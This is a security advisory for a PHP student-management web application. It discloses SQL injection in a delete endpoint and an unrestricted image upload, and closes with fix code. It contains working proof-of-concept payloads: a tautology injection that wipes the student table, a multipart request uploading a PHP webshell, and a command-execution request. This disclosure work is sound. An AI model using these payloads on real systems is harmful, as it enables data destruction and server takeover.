# SQL Injection + Remote Code Execution — Student Management System

**Repository:** https://github.com/diveshlunker/Management-system-students  
**GitHub Issue:** https://github.com/diveshlunker/Management-system-students/issues/8  
**Severity:** Critical (CVSS v3.1: 9.8)  
**CWE:** CWE-89, CWE-434  
**CVE:** Pending  
**Discovered:** 2026-06-19

## Vulnerability 1: SQL Injection

### `Admin/deleteform.php`
```php
$id = $_REQUEST['sid'];
$qry = "DELETE FROM `student` WHERE `id` = '$id'";
$run = mysqli_query($con, $qry);
```

**PoC:**
```
GET /Admin/deleteform.php?sid=1'OR'1'='1
```
Deletes all student records.

## Vulnerability 2: Unrestricted File Upload → RCE

### `Admin/updatedata.php`
```php
$imagename = $_FILES['simg']['name'];  // No validation
$tempname = $_FILES['simg']['tmp_name'];
move_uploaded_file($tempname, "../dataimg/$imagename");
```

**PoC — PHP Webshell Upload:**
```
POST /Admin/updatedata.php HTTP/1.1
Content-Type: multipart/form-data

--boundary
Content-Disposition: form-data; name="simg"; filename="shell.php"
Content-Type: image/jpeg

<?php system($_GET['cmd']); ?>
--boundary--
```

Access webshell: `GET /dataimg/shell.php?cmd=id`

**Result: Remote Code Execution on the server.**

## Fix
```php
// SQL Injection:
$id = (int) $_REQUEST['sid'];

// File Upload:
$allowed = ['jpg','jpeg','png','gif'];
$ext = strtolower(pathinfo($_FILES['simg']['name'], PATHINFO_EXTENSION));
if (!in_array($ext, $allowed)) die('Invalid file type');
$safe = bin2hex(random_bytes(8)) . '.' . $ext;
move_uploaded_file($_FILES['simg']['tmp_name'], "../dataimg/$safe");
```
